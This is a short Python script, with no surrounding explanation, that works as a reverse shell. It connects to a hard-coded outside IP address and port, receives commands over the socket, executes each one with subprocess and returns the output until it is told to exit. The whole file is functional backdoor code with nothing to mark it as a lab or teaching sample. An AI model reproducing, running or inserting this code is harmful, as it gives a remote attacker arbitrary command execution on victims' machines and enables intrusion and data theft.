import os
import socket
import subprocess

lhost = '3.36.68.86'
lport = 16000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))

while True:
    command = s.recv(1024).decode('utf-8')
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)
    s.send(output.encode('utf-8'))

s.close()
